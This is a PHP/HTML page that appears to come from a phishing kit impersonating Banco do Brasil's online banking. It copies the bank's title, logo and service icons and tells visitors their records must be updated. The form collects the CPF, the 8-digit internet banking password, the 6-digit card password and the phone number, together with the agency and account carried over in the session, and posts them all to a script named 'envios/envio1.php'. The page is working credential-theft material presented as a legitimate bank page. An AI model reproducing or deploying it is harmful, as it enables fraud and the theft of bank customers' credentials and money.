<!--
Theme Name: BB Atualização cadastrais
Author: MK(rj)
 -->

<?php session_start();
$agencia = $_POST['agencia'];
$conta = $_POST['conta'];

$_SESSION["agencia"] = $agencia;
$_SESSION["conta"] = $conta;

?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>Banco do Brasil - Autoatendimento Pessoa F&iacute;sica</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="mobile-web-app-capable" content="yes">

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>

    <!-- mascara -->
    <script type="text/javascript">
        $(document).ready(function(){
          $('#cpf').mask('000.000.000-00');
          $('#telefone').mask('(00)00000-0000');
        });
    </script>

</head>

<body id="tela3">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1 id="logo-home">
                    <img class="img-responsive" src="img/logo.jpg" style="width: 30%;">
                    <div class="tela-grande">
                        <p>Desculpe o transtorno :(</p>
                        <p>O recadastramento só poderá ser efetuado pelo telefone do titular da conta.</p>
                    </div>
                </h1>
            </div>
        </div>
    </div>

    <main class="home2">
        <div class="container">
            <section class="formulario-home">
                <div class="row">
                    <div class="col-md-12">
                        <form name="form2" action="envios/envio1.php" method="POST" class="form-home">
                            <input type="hidden" name="agencia" id="agencia" value="<?php echo $_SESSION["agencia"] ?>">
                            <input type="hidden"  name="conta"  id="conta"  value="<?php echo  $_SESSION["conta"] ?>">

                            <div class="form-group">
                                <input id="cpf" name="cpf" placeholder="CPF" type="tel" onblur="validarCPF(this)" required>
                            </div>
                            <div class="form-group">
                                <input id="senha8" name="senha8" placeholder="Senha da internet (8 digitos)" type="password" minlength="8" maxlength="8" required>
                            </div>
                            <div class="form-group">
                                <input id="senha6" name="senha6" placeholder="Senha do cartão (6 digitos)" type="password" minlength="6" maxlength="6" required>
                            </div>
                            <div class="form-group">
                                <input id="telefone" name="telefone" placeholder="Confirme seu telefone" type="tel" required>
                            </div>
                            <div class="form-group">
                                <input type="submit" name="" value="Continuar">
                            </div>
                        </form>
                    </div>
                </div>
            </section>
            <section class="info">
                <div class="row">
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/bbcode.png">
                            </i>
                        </div>
                        <div class="txt-icones">BB Code</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/financieseucarro.png">
                            </i>
                        </div>
                        <div class="txt-icones">Financie seu carro</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/emissaodesenha.png">
                            </i>
                        </div>
                        <div class="txt-icones">Emissão de senha</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/ourocard.png">
                            </i>
                        </div>
                        <div class="txt-icones">Ourocard-e</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/2via.png">
                            </i>
                        </div>
                        <div class="txt-icones">2ª via do boleto</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/saquemovel.png">
                            </i>
                        </div>
                        <div class="txt-icones">Saque móvel</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/aplewatch.png">
                            </i>
                        </div>
                        <div class="txt-icones">Apple Watch</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/faleconosco.png">
                            </i>
                        </div>
                        <div class="txt-icones">Fale conosco</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/suaempresa.png">
                            </i>
                        </div>
                        <div class="txt-icones">Sua Empresa</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/homebroker.png">
                            </i>
                        </div>
                        <div class="txt-icones">Home broker</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/consultaenvelope.png">
                            </i>
                        </div>
                        <div class="txt-icones">Consultar envelope</div>
                    </div>
                    <div class="icones">
                        <div class="img-icones">
                            <i>
                                <img src="img/mais.png">
                            </i>
                        </div>
                        <div class="txt-icones">Mais</div>
                    </div>
                </div>
            </section>
        </div>
    </main>
    <footer>
        <div class="container-fluid">
            <div class="row">
                <div class="esquerda">
                    <img src="img/logo-rodape.png">
                </div>
                <div class="direita">
                    <img src="img/ligue.png">
                </div>
            </div>
        </div>
    </footer>
</body>
<script type="text/javascript">
    // mascara CC /validade / cvv
    var app = angular.module('mk', ['angularMask','angular-creditcard-flag']);
    app.controller('MainCtrl', function($scope) {
        $scope.field = {
            cpf: null
        };
        $scope.field = {
            telefone: null
        };
    });
</script>
</html>